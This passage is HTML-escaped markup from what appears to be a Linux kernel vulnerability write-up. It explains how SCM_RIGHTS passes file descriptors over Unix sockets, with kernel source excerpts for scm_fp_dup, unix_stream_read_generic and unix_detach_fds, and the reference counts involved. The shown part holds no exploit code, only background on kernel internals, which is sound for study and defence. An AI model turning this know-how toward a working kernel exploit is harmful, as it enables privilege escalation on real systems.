class=\"ykcrMYlEiJ-c10\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;count&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;]),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; GFP_KERNEL&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;new_fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;for&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;i &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;count&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;++)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; get_file&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;]);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; new_fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;max &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;new_fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;count&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; new_fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;user &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;get_uid&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;return&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;new_fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Let&amp;rsquo;s examine a concrete example. Assume we have sockets &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;attempts to pass itself to &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;. After the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;datagram is sent, the newly allocated &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the sender will be appended to the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;rsquo;s &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_receive_queue&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;which stores received datagrams:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNWAkA0RVb4goO21_FhJOVV-LSNTfbXV7GKoqH-CUrdMTpDcNUSQxEssrnAVGxC50aK-Z3HfIWeDyCgkr6lb5-a1Ha9Km5ppaHeBzWmLj8NTmZtUjx8J-VzzM1O7mYdjOfw2ErddrslDXw6rDZrs0g1DEC1Ya4VAbkLKKEhZgNPeiSefH-xpv3zDa8/s1438/image71.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNWAkA0RVb4goO21_FhJOVV-LSNTfbXV7GKoqH-CUrdMTpDcNUSQxEssrnAVGxC50aK-Z3HfIWeDyCgkr6lb5-a1Ha9Km5ppaHeBzWmLj8NTmZtUjx8J-VzzM1O7mYdjOfw2ErddrslDXw6rDZrs0g1DEC1Ya4VAbkLKKEhZgNPeiSefH-xpv3zDa8/s1200/image71.png\" border=\"0\" alt=\"unix_stream_sendmsg creates sk_buff which contains the structure scm_fp_list. The scm_fp_list has a fp pointer points to the transmitted file (A). The sk_buff is appended to the receiver queue and the reference count of A is 2.\" style=\"max-height: 750px; max-width: 600px;\"title=\"unix_stream_sendmsg creates sk_buff which contains the structure scm_fp_list. The scm_fp_list has a fp pointer points to the transmitted file (A). The sk_buff is appended to the receiver queue and the reference count of A is 2.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_buff&lt;/span&gt;&lt;span&gt;&amp;nbsp;carries &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;structure&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The reference count of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;is incremented to 2 and the reference count of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;is still 1.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.b16dgtqtkmv1\"&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;Receiving&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Now, let&amp;rsquo;s take a look at the receiver side &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_stream_read_generic&lt;/span&gt;&lt;span&gt;&amp;nbsp;(we will not discuss the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag yet, and focus on the normal &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L2445\"&gt;routine&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). First of all, the kernel grabs the current &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_receive_queue&lt;/span&gt;&lt;span&gt;&amp;nbsp;using &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb_peek&lt;/span&gt;&lt;span&gt;. Secondly, since &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_list&lt;/span&gt;&lt;span&gt;&amp;nbsp;is attached to the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;, the kernel will call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/scm.c#L125\"&gt;link&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;to parse the transmitted file structures from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;and clear the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_receive_queue&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.d7b1cde66ffafc113438777cb255432b8ed4e0e4\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Mark read part of skb as used */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(!(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;flags &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;MSG_PEEK&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;))&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;consumed &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;+=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;chunk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sk_peek_offset_bwd&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;chunk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; unix_detach_fds&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_skb_len&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;break&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; skb_unlink&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk_receive_queue&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; consume_skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;.&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;break&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The function &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_detach_fds&lt;/span&gt;&lt;span&gt;&amp;nbsp;iterates over the list of passed file descriptors (&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm-&amp;gt;fp)&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;and installs the new file descriptors accordingly for the receiver:&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.cccd27f0609fb1b03a888ddc1137e5fe1004a78a\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;for&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;cmfptr&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;__force &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;int&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;__user &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;CMSG_DATA&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;cm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fdmax&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;++,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;cmfptr&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;++)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sock&lt;/span&gt;&lt;span 